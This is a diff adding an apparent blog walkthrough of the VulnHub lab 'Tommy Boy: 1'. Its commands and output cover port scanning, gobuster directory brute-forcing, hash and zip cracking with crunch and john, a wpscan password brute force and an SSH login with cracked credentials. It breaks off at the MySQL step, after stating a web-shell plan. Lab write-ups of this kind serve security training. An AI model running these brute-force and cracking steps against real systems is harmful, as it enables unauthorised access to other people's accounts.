@@ -1,0 +1,268 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Tommy Boy: 1 Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Tommy Boy: 1 Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#bigtommysenior">Shell - bigtommysenior</a></li>
+        <li><a href="#www-data">Shell - www-data</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>This box followed through with an entire Tommy Boy themed story line.  It started through the web server, finding a wordpress site, gaining credentials, and getting SSH.  From there we had to gain credentials from the mysql server, go back to the wordpress site, create a web shell, and gain a shell as www-data in order to gain read access to important files.  From there the box was pwned.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Mon Sep 27 16:01:40 2021 as: nmap -p- -oN ping_tcp 10.0.0.22&#13;&#10;Nmap scan report for 10.0.0.22&#13;&#10;Host is up (0.0017s latency).&#13;&#10;Not shown: 65531 closed ports&#13;&#10;PORT      STATE SERVICE&#13;&#10;22/tcp    open  ssh&#13;&#10;80/tcp    open  http&#13;&#10;8008/tcp  open  http&#13;&#10;65534/tcp open  unknown&#13;&#10;MAC Address: 00:0C:29:6E:ED:CF (VMware)&#13;&#10;&#13;&#10;# Nmap done at Mon Sep 27 16:01:48 2021 -- 1 IP address (1 host up) scanned in 8.10 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Mon Sep 27 16:02:01 2021 as: nmap -p22,80,8008,65534 -sV -sC -oN script_tcp 10.0.0.22&#13;&#10;Nmap scan report for 10.0.0.22&#13;&#10;Host is up (0.00030s latency).&#13;&#10;&#13;&#10;PORT      STATE SERVICE VERSION&#13;&#10;22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 (RSA)&#13;&#10;|   256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 (ECDSA)&#13;&#10;|_  256 56:9e:71:2a:a3:83:ff:63:11:7e:94:08:dd:28:1d:46 (ED25519)&#13;&#10;80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))&#13;&#10;| http-robots.txt: 4 disallowed entries &#13;&#10;| /6packsofb...soda /lukeiamyourfather &#13;&#10;|_/lookalivelowbridge /flag-numero-uno.txt&#13;&#10;|_http-server-header: Apache/2.4.18 (Ubuntu)&#13;&#10;|_http-title: Welcome to Callahan Auto&#13;&#10;8008/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))&#13;&#10;|_http-server-header: Apache/2.4.18 (Ubuntu)&#13;&#10;|_http-title: KEEP OUT&#13;&#10;65534/tcp open  ftp     ProFTPD 1.2.10&#13;&#10;MAC Address: 00:0C:29:6E:ED:CF (VMware)&#13;&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Mon Sep 27 16:02:36 2021 -- 1 IP address (1 host up) scanned in 35.70 seconds
+    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>I can't figure out the FTP creds so I start enumerating the web servers.  I begin with port 80.  Robots.txt gives me a flag and a few pictures.  But none of it seems to lead anywhere.  I then go back to the main page http://10.0.0.22 and look at the source code.  In the source code I find some comments that lead us to to the next step in gaining a foothold.</li>
+
+    <pre>
+&lt;!--Comment from Nick: backup copy is in Big Tom&apos;s home folder--&gt;&#13;&#10;&lt;!--Comment from Richard: can you give me access too? Big Tom&apos;s the only one w/password--&gt;&#13;&#10;&lt;!--Comment from Nick: Yeah yeah, my processor can only handle one command at a time--&gt;&#13;&#10;&lt;!--Comment from Richard: please, I&apos;ll ask nicely--&gt;&#13;&#10;&lt;!--Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog--&gt;&#13;&#10;&lt;!--Comment from Richard: Deal.  Where&apos;s the blog again?--&gt;&#13;&#10;&lt;!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It&apos;s here if you don&apos;t remember: https://www.youtube.com/watch?v=VUxOd4CszJ8--&gt; &#13;&#10;&lt;!--Comment from Richard: Ah! How could I forget?  Thanks--&gt;
+    </pre>
+
+    <li>After watching the youtube link we can guess that the web directory we are looking for is "/prehistoricforest/.  http://10.0.0.22/prehistoricforest/ leads us to a wordpress page.  There is a password protected post on the wordpress page at this link, http://10.0.0.22/prehistoricforest/index.php/2016/07/06/status-of-restoring-company-home-page/,  and there is another post here, http://10.0.0.22/prehistoricforest/index.php/2016/07/06/status-of-restoring-company-home-page/, which tells us to go to /richard to find the password to the password protected wordpress post.  /richard leads us to a picture that we download and examine with exiftool.</li>
+
+    <br>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1/nmap]&#13;&#10;&boxur;&HorizontalLine;$ wget http://10.0.0.22/richard/shockedrichard.jpg                                                                                          &#13;&#10;--2021-09-27 18:38:09--  http://10.0.0.22/richard/shockedrichard.jpg&#13;&#10;Connecting to 10.0.0.22:80... connected.&#13;&#10;HTTP request sent, awaiting response... 200 OK&#13;&#10;Length: 167037 (163K) [image/jpeg]&#13;&#10;Saving to: &OpenCurlyQuote;shockedrichard.jpg&rsquor;&#13;&#10;&#13;&#10;shockedrichard.jpg                      100%[=============================================================================&gt;] 163.12K  --.-KB/s    in 0.001s  &#13;&#10;&#13;&#10;2021-09-27 18:38:09 (273 MB/s) - &OpenCurlyQuote;shockedrichard.jpg&rsquor; saved [167037/167037]&#13;&#10;&#13;&#10;                                                                                                                                                              &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1/nmap]&#13;&#10;&boxur;&HorizontalLine;$ exiftool shockedrichard.jpg                                                             &#13;&#10;ExifTool Version Number         : 12.30&#13;&#10;File Name                       : shockedrichard.jpg&#13;&#10;Directory                       : .&#13;&#10;File Size                       : 163 KiB&#13;&#10;File Modification Date/Time     : 2016:07:07 15:17:24-04:00&#13;&#10;File Access Date/Time           : 2021:09:27 18:38:09-04:00&#13;&#10;File Inode Change Date/Time     : 2021:09:27 18:38:09-04:00&#13;&#10;File Permissions                : -rw-r--r--&#13;&#10;File Type                       : JPEG&#13;&#10;File Type Extension             : jpg&#13;&#10;MIME Type                       : image/jpeg&#13;&#10;JFIF Version                    : 1.01&#13;&#10;Resolution Unit                 : None&#13;&#10;X Resolution                    : 1&#13;&#10;Y Resolution                    : 1&#13;&#10;Exif Byte Order                 : Little-endian (Intel, II)&#13;&#10;Software                        : Google&#13;&#10;Copyright                       : Copyright &copy; 1995 Paramount Pictures Corporation. Credit: &copy; 1995 Paramount Pictures / Courtesy: Pyxurz.&#13;&#10;Exif Version                    : 0220&#13;&#10;<marK>User Comment                    : ce154b5a8e59c89732bc25d6a2e6b90b</marK>
+Exif Image Width                : 1600&#13;&#10;Exif Image Height               : 1029&#13;&#10;XMP Toolkit                     : Image::ExifTool 9.97&#13;&#10;Rights                          : Copyright &copy; 1995 Paramount Pictures Corporation. Credit: &copy; 1995 Paramount Pictures / Courtesy: Pyxurz.&#13;&#10;Creator Tool                    : Google&#13;&#10;Profile CMM Type                : Linotronic&#13;&#10;Profile Version                 : 2.1.0&#13;&#10;Profile Class                   : Display Device Profile&#13;&#10;Color Space Data                : RGB&#13;&#10;Profile Connection Space        : XYZ&#13;&#10;Profile Date Time               : 1998:02:09 06:49:00&#13;&#10;Profile File Signature          : acsp&#13;&#10;Primary Platform                : Microsoft Corporation&#13;&#10;CMM Flags                       : Not Embedded, Independent&#13;&#10;Device Manufacturer             : Hewlett-Packard&#13;&#10;Device Model                    : sRGB&#13;&#10;Device Attributes               : Reflective, Glossy, Positive, Color&#13;&#10;Rendering Intent                : Media-Relative Colorimetric&#13;&#10;Connection Space Illuminant     : 0.9642 1 0.82491&#13;&#10;Profile Creator                 : Hewlett-Packard&#13;&#10;Profile ID                      : 0&#13;&#10;Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company&#13;&#10;Profile Description             : sRGB IEC61966-2.1&#13;&#10;Media White Point               : 0.95045 1 1.08905&#13;&#10;Media Black Point               : 0 0 0&#13;&#10;Red Matrix Column               : 0.43607 0.22249 0.01392&#13;&#10;Green Matrix Column             : 0.38515 0.71687 0.09708&#13;&#10;Blue Matrix Column              : 0.14307 0.06061 0.7141&#13;&#10;Device Mfg Desc                 : IEC http://www.iec.ch&#13;&#10;Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB&#13;&#10;Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1&#13;&#10;Viewing Cond Illuminant         : 19.6445 20.3718 16.8089&#13;&#10;Viewing Cond Surround           : 3.92889 4.07439 3.36179&#13;&#10;Viewing Cond Illuminant Type    : D50&#13;&#10;Luminance                       : 76.03647 80 87.12462&#13;&#10;Measurement Observer            : CIE 1931&#13;&#10;Measurement Backing             : 0 0 0&#13;&#10;Measurement Geometry            : Unknown&#13;&#10;Measurement Flare               : 0.999%&#13;&#10;Measurement Illuminant          : D65&#13;&#10;Technology                      : Cathode Ray Tube Display&#13;&#10;Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)&#13;&#10;Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)&#13;&#10;Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)&#13;&#10;Current IPTC Digest             : adfc7551120fa16884c295b6d397931f&#13;&#10;Envelope Record Version         : 4&#13;&#10;Coded Character Set             : UTF8&#13;&#10;Application Record Version      : 4&#13;&#10;Copyright Notice                : Copyright &copy; 1995 Paramount Pictures Corporation. Credit: &copy; 1995 Paramount Pictures / Courtesy: Pyxurz.&#13;&#10;IPTC Digest                     : adfc7551120fa16884c295b6d397931f&#13;&#10;Image Width                     : 1600&#13;&#10;Image Height                    : 1029&#13;&#10;Encoding Process                : Baseline DCT, Huffman coding&#13;&#10;Bits Per Sample                 : 8&#13;&#10;Color Components                : 3&#13;&#10;Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)&#13;&#10;Image Size                      : 1600x1029&#13;&#10;Megapixels                      : 1.6
+    </pre>
+
+    <li>The "User Comment" looks like a md5 hash so I crack it with hashcat and find out that the password is "spanky".  Now we can look at the password protected post on this page - http://10.0.0.22/prehistoricforest/index.php/2016/07/06/status-of-restoring-company-home-page/.</li>
+
+    <li>We learn a few things from this post</li>
+    <ul>
+        <li>There is a backup of the web page called callahanbak.bak that we can change to index.html and the website will be up and running again.</li>
+        <ul>
+            <li>We must SSH in under Big Tom's account to do this.</li>
+            <ul>
+                <li>Big Tom's account is not accurately named, so we will need to find out his account name.</li>
+                <ul>
+                    <li>We can find his account name by looking at the list of users on the system.  Not sure where to find this at this point.</li>
+                </ul>
+            </ul>
+        </ul>
+        <li>The FTP server will have useful information for us.</li>
+        <ul>
+            <li>The FTP server is flakey.  It supposedly turns off and on every 15 minutes.</li>
+            <li>It is running on a random port number.  We already have enumerated this.</li>
+            <li>The account name is nickburns</li>
+            <li>The password is supposed to be very easy to guess.</li>
+        </ul>
+    </ul>
+
+    <br>
+    <h2><a id="bigtommysenior">Shell - bigtommysenior</a></h2>
+
+    <li>First I login the the FTP server.  The credentials turn out to be nickburns:nickburns.  On the FTP server is file named readme.txt.  I download it.  It reveals a directory that works as a dropbox named "NickIzL33t".  It also says I should be able to find Big Tom's password in that directory.  I browse to the dropbox on port 8008 but I hit a roadblock</li>
+
+    <br>
+
+    <li> The web page just says</li>
+
+    <pre>
+Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content
+Lol
+    </pre>
+
+    <li>Thinking back to the readme.txt that I downloaded from the FTP server, it mentioned looking at files from this website on your phone.  So I used burp to intercept web requests and change my user agent to make it look like I am browsing from a phone.</li>
+
+    <img src="../images/tommyboy1/ios_useragent.png">
+
+    <br>
+    <br>
+
+    <li>Now when I browse to http://10.0.0.22:8008/NickIzL33t/ I get text saying</li>
+    
+    <pre>
+Well, you passed the dummy test
+But Nick's secret door isn't that easy to open.
+Gotta know the EXACT name of the .html to break into this fortress.
+Good luck brainiac.
+Lol
+-Nick 
+    </pre>
+
+    <li>I used gobuster to find the .html file name.  I used a few different wordlists before landing on rockyou.txt.  I also setup gobuster to with the user-agent to identify as a cell phone (iphone in this case).</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ gobuster dir -u http://10.0.0.22:8008/NickIzL33t/ -w /usr/share/wordlists/rockyou.txt -x html -a &quot;User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3&quot; | tee nickisl33t&#13;&#10;===============================================================&#13;&#10;Gobuster v3.1.0&#13;&#10;by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)&#13;&#10;===============================================================&#13;&#10;[+] Url:                     http://10.0.0.22:8008/NickIzL33t/&#13;&#10;[+] Method:                  GET&#13;&#10;[+] Threads:                 10&#13;&#10;[+] Wordlist:                /usr/share/wordlists/rockyou.txt&#13;&#10;[+] Negative Status codes:   404&#13;&#10;[+] User Agent:              User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3&#13;&#10;[+] Extensions:              html&#13;&#10;[+] Timeout:                 10s&#13;&#10;===============================================================&#13;&#10;2021/09/27 20:28:00 Starting gobuster in directory enumeration mode&#13;&#10;===============================================================&#13;&#10;Progress: 6644 / 28688786 (0.02%)[ERROR] 2021/09/27 20:28:01 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/!@#$%^&quot;: invalid URL escape &quot;%^&quot;&#13;&#10;Progress: 40776 / 28688786 (0.14%)[ERROR] 2021/09/27 20:28:03 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/!\&quot;&pound;$%^&quot;: invalid URL escape &quot;%^&quot;&#13;&#10;Progress: 47376 / 28688786 (0.17%)[ERROR] 2021/09/27 20:28:04 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/!@#$%^&amp;*()&quot;: invalid URL escape &quot;%^&amp;&quot;&#13;&#10;/??????.html          (Status: 200) [Size: 270]&#13;&#10;/??????               (Status: 200) [Size: 270]&#13;&#10;Progress: 67280 / 28688786 (0.23%)            [ERROR] 2021/09/27 20:28:06 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/100%sexy&quot;: invalid URL escape &quot;%se&quot;&#13;&#10;[ERROR] 2021/09/27 20:28:06 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/100%angel&quot;: invalid URL escape &quot;%an&quot;&#13;&#10;Progress: 73806 / 28688786 (0.26%)            [ERROR] 2021/09/27 20:28:06 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/!@#$%^&amp;*&quot;: invalid URL escape &quot;%^&amp;&quot;&#13;&#10;Progress: 80402 / 28688786 (0.28%)            [ERROR] 2021/09/27 20:28:06 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/100%bitch&quot;: invalid URL escape &quot;%bi&quot;&#13;&#10;///////               (Status: 200) [Size: 270]&#13;&#10;///////.html          (Status: 403) [Size: 94] &#13;&#10;Progress: 106792 / 28688786 (0.37%)           [ERROR] 2021/09/27 20:28:08 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/!@#$%^&amp;*(&quot;: invalid URL escape &quot;%^&amp;&quot;&#13;&#10;Progress: 119898 / 28688786 (0.42%)           [ERROR] 2021/09/27 20:28:09 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/100%me&quot;: invalid URL escape &quot;%me&quot;&#13;&#10;Progress: 133056 / 28688786 (0.46%)           [ERROR] 2021/09/27 20:28:11 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/100%cute&quot;: invalid URL escape &quot;%cu&quot;&#13;&#10;Progress: 139692 / 28688786 (0.49%)           [ERROR] 2021/09/27 20:28:11 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/!@#$%^&amp;&quot;: invalid URL escape &quot;%^&amp;&quot;&#13;&#10;[ERROR] 2021/09/27 20:28:11 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/!@#$%&quot;: invalid URL escape &quot;%&quot;&#13;&#10;Progress: 152810 / 28688786 (0.53%)           [ERROR] 2021/09/27 20:28:12 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/100%love&quot;: invalid URL escape &quot;%lo&quot;&#13;&#10;[ERROR] 2021/09/27 20:28:12 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/!\&quot;&pound;$%^&amp;*()&quot;: invalid URL escape &quot;%^&amp;&quot;&#13;&#10;Progress: 172212 / 28688786 (0.60%)           [ERROR] 2021/09/27 20:28:13 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/100%cool&quot;: invalid URL escape &quot;%co&quot;&#13;&#10;/fallon1.html         (Status: 200) [Size: 459]&#13;&#10;Progress: 205096 / 28688786 (0.71%)           [ERROR] 2021/09/27 20:28:16 [!] parse &quot;http://10.0.0.22:8008/NickIzL33t/100%real&quot;: invalid URL escape &quot;%re&quot;
+    </pre>
+
+    <li>The output is a little messy but I watched the output until an interesting status 200 returned.  fallon1.html turns out to be the correct .html file name.</li>
+    
+    <br>
+
+    <li>http://10.0.0.22:8008/NickIzL33t/ we are presented with a few different links</li>
+    <ul>
+        <li>http://10.0.0.22:8008/NickIzL33t/hint.txt</li>
+        <ul>
+            <li>Gives us the criteria required for Big Tom's password</li>
+            <ul>
+                <li>Starts with "bev"</li>
+                <li>One uppercase character</li>
+                <li>Two numbers</li>
+                <li>Two lowercase characters</li>
+                <li>One symbol</li>
+                <li>The year Tommy boy came out in theaters (1995)</li>
+            </ul>
+        </ul>
+        <li>http://10.0.0.22:8008/NickIzL33t/flagtres.txt</li>
+        <ul>
+            <li>The 3rd flag</li>
+        </ul>
+        <li>http://10.0.0.22:8008/NickIzL33t/t0msp4ssw0rdz.zip</li>
+        <ul>
+            <li>The encrypted backup file</li>
+        </ul>
+    </ul>
+
+    <li>First I download t0msp4ssw0rdz.zip and then I generate a wordlist, based on the criteria given, to crack the zip file password.  I used the tool crunch to generate the list.</li>
+    
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ crunch 13 13 -t bev,%%@@^1995 -o pass.lst                                                                                                              130 &Cross;
+    </pre>
+
+    <li>Then I used zip2john to generate a password hash to crack.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ zip2john t0msp4ssw0rdz.zip &gt; pass_hash&#13;&#10;ver 2.0 efh 5455 efh 7875 t0msp4ssw0rdz.zip/passwords.txt PKZIP Encr: 2b chk, TS_chk, cmplen=332, decmplen=641, crc=DF15B771
+    </pre>
+
+    <li>After creating the hash, I use john to crack the hash while using the password list generated by crunch as the wordlist</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ john --wordlist=pass.lst pass_hash&#13;&#10;Using default input encoding: UTF-8&#13;&#10;Loaded 1 password hash (PKZIP [32/64])&#13;&#10;Will run 4 OpenMP threads&#13;&#10;Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status&#13;&#10;bevH00tr$1995    (t0msp4ssw0rdz.zip/passwords.txt)&#13;&#10;1g 0:00:00:01 DONE (2021-09-28 09:51) 0.7751g/s 12122Kp/s 12122Kc/s 12122KC/s bevH00re{1995..bevH01as&apos;1995&#13;&#10;Use the &quot;--show&quot; option to display all of the cracked passwords reliably&#13;&#10;Session completed
+    </pre>
+
+    <li>The password bevH00tr$1995 is revelead.  We can now unzip and read the encrypted password file.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ cat passwords.txt &#13;&#10;Sandusky Banking Site&#13;&#10;------------------------&#13;&#10;Username: BigTommyC&#13;&#10;Password: money&#13;&#10;&#13;&#10;TheKnot.com (wedding site)&#13;&#10;---------------------------&#13;&#10;Username: TomC&#13;&#10;Password: wedding&#13;&#10;&#13;&#10;Callahan Auto Server&#13;&#10;----------------------------&#13;&#10;Username: bigtommysenior&#13;&#10;Password: fatguyinalittlecoat&#13;&#10;&#13;&#10;Note: after the &quot;fatguyinalittlecoat&quot; part there are some numbers, but I don&apos;t remember what they are.&#13;&#10;However, I wrote myself a draft on the company blog with that information.&#13;&#10;&#13;&#10;Callahan Company Blog&#13;&#10;----------------------------&#13;&#10;Username: bigtom(I think?)&#13;&#10;Password: ??? &#13;&#10;Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
+    </pre>
+
+    <li>The takeaway here, is that we need to get into Tom's wordpress account in order to find the numbers that go after his server (ssh?) password.  The Queen song that the password file hints at is "We Will Rock You" which leads us to rockyou.txt for our password list.  I run wpscan twice to get the valid credentials.  The first time I run it without a user list so that wpscan enumerates users for me.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ wpscan --url http://10.0.0.22/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt &#13;&#10;_______________________________________________________________&#13;&#10;         __          _______   _____&#13;&#10;         \ \        / /  __ \ / ____|&#13;&#10;          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;&#13;&#10;           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \&#13;&#10;            \  /\  /  | |     ____) | (__| (_| | | | |&#13;&#10;             \/  \/   |_|    |_____/ \___|\__,_|_| |_|&#13;&#10;&#13;&#10;         WordPress Security Scanner by the WPScan Team&#13;&#10;                         Version 3.8.18&#13;&#10;       Sponsored by Automattic - https://automattic.com/&#13;&#10;       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart&#13;&#10;_______________________________________________________________&#13;&#10;&#13;&#10;                    (Lines Removed)&#13;&#10;&#13;&#10;[+] Enumerating Users (via Passive and Aggressive Methods)&#13;&#10; Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00&#13;&#10;&#13;&#10;[i] User(s) Identified:&#13;&#10;&#13;&#10;[+] tommy&#13;&#10; | Found By: Author Posts - Author Pattern (Passive Detection)&#13;&#10; | Confirmed By:&#13;&#10; |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; |  Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;[+] richard&#13;&#10; | Found By: Author Posts - Author Pattern (Passive Detection)&#13;&#10; | Confirmed By:&#13;&#10; |  Rss Generator (Passive Detection)&#13;&#10; |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; |  Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;[+] tom&#13;&#10; | Found By: Author Posts - Author Pattern (Passive Detection)&#13;&#10; | Confirmed By:&#13;&#10; |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; |  Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;[+] Tom Jr.&#13;&#10; | Found By: Rss Generator (Passive Detection)&#13;&#10;&#13;&#10;[+] Big Tom&#13;&#10; | Found By: Rss Generator (Passive Detection)&#13;&#10;&#13;&#10;[+] michelle&#13;&#10; | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; | Confirmed By: Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;[+] Performing password attack on Wp Login against 6 user/s&#13;&#10;^Cying Tom Jr. / kiss Time: 00:09:58 &lt;                                    &gt; (92405 / 86066352)  0.10%  ETA: ??:??:??&#13;&#10;[i] No Valid Passwords Found.&#13;&#10;&#13;&#10;[!] No WPScan API Token given, as a result vulnerability data has not been output. / 86066352)  0.10%  ETA: ??:??:??&#13;&#10;[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register&#13;&#10;&#13;&#10;[+] Finished: Tue Sep 28 10:49:48 2021&#13;&#10;[+] Requests Done: 92577&#13;&#10;[+] Cached Requests: 39&#13;&#10;[+] Data Sent: 49.071 MB&#13;&#10;[+] Data Received: 339.861 MB&#13;&#10;[+] Memory used: 303.793 MB&#13;&#10;[+] Elapsed time: 00:10:03&#13;&#10;&#13;&#10;Scan Aborted: Canceled by User
+    </pre>
+
+    <li>It takes too long to brute force against all of the users that were enumerated so I take "big tom" and "tom" and put them in a user list so I am only brute forcing against those two usernames.  The other usernames do not seem like they would apply to Tom Sr., which is who's account we are trying to access.  So I run wordpress again using this username list and I get valid credentials.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ wpscan --url http://10.0.0.22/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt -U ./users.lst         2 &Cross;&#13;&#10;_______________________________________________________________&#13;&#10;         __          _______   _____&#13;&#10;         \ \        / /  __ \ / ____|&#13;&#10;          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;&#13;&#10;           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \&#13;&#10;            \  /\  /  | |     ____) | (__| (_| | | | |&#13;&#10;             \/  \/   |_|    |_____/ \___|\__,_|_| |_|&#13;&#10;&#13;&#10;         WordPress Security Scanner by the WPScan Team&#13;&#10;                         Version 3.8.18&#13;&#10;       Sponsored by Automattic - https://automattic.com/&#13;&#10;       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart&#13;&#10;_______________________________________________________________&#13;&#10;&#13;&#10;                (Lines Removed)&#13;&#10;&#13;&#10;[+] Performing password attack on Wp Login against 2 user/s&#13;&#10;[SUCCESS] - tom / tomtom1                                                                                           &#13;&#10;^Cying big tom / 210491 Time: 00:05:28 &lt;                                  &gt; (53196 / 28713447)  0.18%  ETA: 49:12:52&#13;&#10;[!] Valid Combinations Found:&#13;&#10; | Username: tom, Password: tomtom1
+    </pre>
+
+    <li>Now we can login to http://10.0.0.22/prehistoricforest/wp-login.php with tom:tomtom1 and read his drafts to see which numbers come after his SSH password.</li>
+
+    <img src="../images/tommyboy1/wp_draft.png">
+
+    <br>
+    <br>
+
+    <li>We can now SSH in using the credentials bigtommysenior:fatguyinalittlecoat1938!!</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ ssh bigtommysenior@10.0.0.22                                                                              130 &Cross;&#13;&#10;bigtommysenior@10.0.0.22&apos;s password: &#13;&#10;Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-31-generic x86_64)&#13;&#10;&#13;&#10; * Documentation:  https://help.ubuntu.com/&#13;&#10;&#13;&#10;143 packages can be updated.&#13;&#10;0 updates are security updates.&#13;&#10;&#13;&#10;&#13;&#10;Last login: Thu Jul 14 13:45:57 2016&#13;&#10;bigtommysenior@CallahanAutoSrv01:~$ 
+    </pre>
+
+    <h2><a id="www-data">Shell - www-data</a></h2>
+
+    <li>Once on the box, we find a file called LOOT.ZIP in bigtommysenior's home directory.  The file is encrypted and I am unable to crack it.  There is another file called el-flag-numero-quatro.txt.  This file gives us the 4th flag for the box.  It also tells us the 5th flag is locate in the root directory /5.txt.  The 5th flag is unreadable by us but owned by www-data.  If we can get a shell as www-data we will get access to the 5th flag.</li>
+
+    <br>
+
+    <li>If we can login to wordpress as an admin user then we can get a web shell as www-data, and subsequently a full reverse shell.  We look to mysql to find credentials for a wordpress admin account.  The mysql credentials are found in /var/www/html/prehistoricforest/wp-admin.php</li>
+
+    <pre>
+define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);&#13;&#10;define(&apos;DB_USER&apos;, &apos;wordpressuser&apos;);&#13;&#10;define(&apos;DB_PASSWORD&apos;, &apos;CaptainLimpWrist!!!&apos;);&#13;&#10;define(&apos;DB_HOST&apos;, &apos;localhost&apos;);&#13;&#10;define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);&#13;&#10;define(&apos;DB_COLLATE&apos;, &apos;&apos;);
+    </pre>
+
+    <li>I log into the mysql databases.  \'s are required to escape the ! characters.</li>
+
+    <pre>
